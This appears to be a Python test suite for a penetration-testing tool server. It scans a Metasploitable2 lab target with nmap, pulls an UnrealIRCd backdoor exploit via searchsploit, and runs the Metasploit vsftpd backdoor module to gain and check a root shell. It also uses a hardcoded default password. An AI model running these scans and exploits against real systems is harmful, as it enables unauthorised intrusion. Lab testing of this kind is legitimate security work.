"""
Comprehensive Hercules MCP Tool Test Suite
Tests: Metasploit sessions, Searchsploit, Nmap (against MSF), Shell, Scripts
"""
import os
import time
import docker

MSF_IP = "172.17.0.2"
MSF_PASSWORD = os.environ.get("MSF_PASSWORD", "hercules123")
PASS = "\033[92m[PASS]\033[0m"
FAIL = "\033[91m[FAIL]\033[0m"
INFO = "\033[94m[INFO]\033[0m"

def run(container, cmd, timeout=120):
    """Run a command and return decoded output."""
    res = container.exec_run(["bash", "-c", cmd], demux=True)
    stdout = (res.output[0] or b"").decode("utf-8", errors="replace")
    stderr = (res.output[1] or b"").decode("utf-8", errors="replace")
    return res.exit_code, stdout, stderr

def check(name, condition, output_snippet=""):
    """Print pass/fail for a test."""
    if condition:
        print(f"  {PASS} {name}")
    else:
        print(f"  {FAIL} {name}")
        if output_snippet:
            for line in output_snippet.strip().split("\n")[:5]:
                print(f"        {line}")

def main():
    client = docker.from_env()

    # Cleanup any old hercules test containers
    for c in client.containers.list(all=True, filters={"name": "hercules-test"}):
        c.remove(force=True)

    print(f"{INFO} Starting Kali container for testing...")
    kali = client.containers.run(
        "kalilinux/kali-rolling",
        command="sleep infinity",
        name="hercules-test",
        detach=True,
        network_mode="host",
        privileged=True,
    )

    print(f"{INFO} Installing tools (nmap, metasploit-framework, exploitdb, python3)...")
    run(kali, "apt-get update -qq")
    code, out, err = run(kali, "apt-get install -y -qq nmap metasploit-framework exploitdb python3 python3-pip", timeout=600)
    print(f"  Tool install exit code: {code}")

    # =========================================================
    # 1. NMAP TESTS against Metasploitable2
    # =========================================================
    print(f"\n{'='*60}")
    print(f" NMAP TESTS (target: {MSF_IP})")
    print(f"{'='*60}")

    # nmap_aggressive_scan
    code, out, _ = run(kali, f"nmap -T4 -A -v {MSF_IP}")
    check("nmap_aggressive_scan", "vsftpd" in out.lower() or "ftp" in out.lower(), out[-300:])

    # nmap_port_scan
    code, out, _ = run(kali, f"nmap -p 21,22,80,445 {MSF_IP}")
    check("nmap_port_scan", "open" in out, out)

    # nmap_script_scan
    code, out, _ = run(kali, f"nmap --script vuln -p 21 {MSF_IP}")
    check("nmap_script_scan", "script" in out.lower() or "vuln" in out.lower() or "CVE" in out, out[-300:])

    # nmap_custom_scan (UDP)
    code, out, _ = run(kali, f"nmap -sU -p 53,161 {MSF_IP}")
    check("nmap_custom_scan (UDP)", "udp" in out.lower() or "open" in out.lower() or "closed" in out.lower(), out)

    # =========================================================
    # 2. SEARCHSPLOIT TESTS
    # =========================================================
    print(f"\n{'='*60}")
    print(" SEARCHSPLOIT TESTS")
    print(f"{'='*60}")

    code, out, _ = run(kali, "searchsploit UnrealIRCd 3.2.8.1")
    check("searchsploit (search)", "unrealircd" in out.lower() or "backdoor" in out.lower(), out[:300])

    code, out, _ = run(kali, "searchsploit -m linux/remote/13853.pl -d /tmp/exploits 2>/dev/null; cat /tmp/exploits/13853.pl 2>/dev/null || echo 'mirror failed'")
    check("searchsploit (get exploit)", "unrealircd" in out.lower() or "perl" in out.lower() or "socket" in out.lower(), out[:300])

    # =========================================================
    # 3. SHELL & SCRIPTS TESTS
    # =========================================================
    print(f"\n{'='*60}")
    print(" SHELL & SCRIPTS TESTS")
    print(f"{'='*60}")

    # shell_exec
    code, out, _ = run(kali, "cat /etc/os-release")
    check("shell_exec", "kali" in out.lower(), out[:200])

    # workspace_scripts (write + run python)
    run(kali, "mkdir -p /opt/workspace/py")
    run(kali, "echo 'print(\"Hercules Working\")' > /opt/workspace/py/test.py")
    code, out, _ = run(kali, "python3 /opt/workspace/py/test.py")
    check("workspace_scripts (python write+run)", "Hercules Working" in out, out)

    # workspace_scripts (write + run shell)
    run(kali, "mkdir -p /opt/workspace/sh")
    run(kali, "echo '#!/bin/bash\necho $USER' > /opt/workspace/sh/test.sh && chmod +x /opt/workspace/sh/test.sh")
    code, out, _ = run(kali, "bash /opt/workspace/sh/test.sh")
    check("workspace_scripts (shell write+run)", out.strip() == "root", out)

    # =========================================================
    # 4. METASPLOIT SESSION TESTS
    # =========================================================
    print(f"\n{'='*60}")
    print(f" METASPLOIT SESSION TESTS (target: {MSF_IP})")
    print(f"{'='*60}")

    # Start PostgreSQL
    print(f"  {INFO} Starting PostgreSQL...")
    for method in [
        "pg_ctlcluster $(pg_lsclusters -h | awk '{print $1}' | head -1) $(pg_lsclusters -h | awk '{print $2}' | head -1) start",
        "/etc/init.d/postgresql start",
    ]:
        code, _, _ = run(kali, method)
        if code == 0:
            print(f"  {INFO} PostgreSQL started via: {method[:50]}")
            break
    else:
        print(f"  {INFO} PostgreSQL could not start, continuing without DB.")

    # Init msfdb
    run(kali, "msfdb init 2>/dev/null || true")

    # Start msfrpcd
    print(f"  {INFO} Starting msfrpcd...")
    run(kali, f"msfrpcd -P {MSF_PASSWORD} -S -a 127.0.0.1 &")
    time.sleep(5)

    # Wait for msfrpcd
    msf_ready = False
    for i in range(30):
        code, out, _ = run(kali, "curl -sk https://127.0.0.1:55553 2>/dev/null || curl -s http://127.0.0.1:55553 2>/dev/null")
        if code == 0 and out.strip():
            msf_ready = True
            break
        # Also check if the process is even running
        code2, out2, _ = run(kali, "pgrep -f msfrpcd")
        if code2 == 0:
            msf_ready = True
            break
        time.sleep(2)

    check("msfrpcd startup", msf_ready)

    if msf_ready:
        # Use msfconsole to run the exploit (more reliable than RPC for testing)
        print(f"  {INFO} Running vsftpd exploit via msfconsole...")
        exploit_rc = f"""use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {MSF_IP}
set RPORT 21
exploit -j
"""
        run(kali, f"echo '{exploit_rc}' > /tmp/exploit.rc")
        code, out, err = run(kali,
            "timeout 45 msfconsole -q -r /tmp/exploit.rc -x 'sleep 10; sessions -l; exit' 2>&1",
            timeout=90
        )
        print(f"  {INFO} msfconsole output (last 500 chars):")
        for line in out[-500:].split("\n"):
            print(f"        {line}")

        has_session = "command shell" in out.lower() or "session 1" in out.lower() or "opened" in out.lower()
        check("metasploit_run_module (vsftpd exploit)", has_session, out[-300:])
        check("metasploit_list_sessions", "active sessions" in out.lower() or "session" in out.lower(), "")

        # If we got a session, try interacting
        if has_session:
            print(f"  {INFO} Interacting with session...")
            code, out, _ = run(kali,
                "timeout 20 msfconsole -q -x 'sessions -i 1; whoami; uname -a; exit' 2>&1",
                timeout=30
            )
            has_whoami = "root" in out.lower()
            check("metasploit_interact_session (whoami)", has_whoami, out[-300:])
        else:
            print(f"  {FAIL} metasploit_interact_session (no session to interact with)")
    else:
        print(f"  {FAIL} Skipping MSF exploit tests — msfrpcd did not start.")

    # =========================================================
    # SUMMARY
    # =========================================================
    print(f"\n{'='*60}")
    print(" TEST SUITE COMPLETE")
    print(f"{'='*60}")

    print(f"\n{INFO} Cleaning up container...")
    kali.stop()
    kali.remove(force=True)
    print(f"{INFO} Done.")

if __name__ == "__main__":
    main()
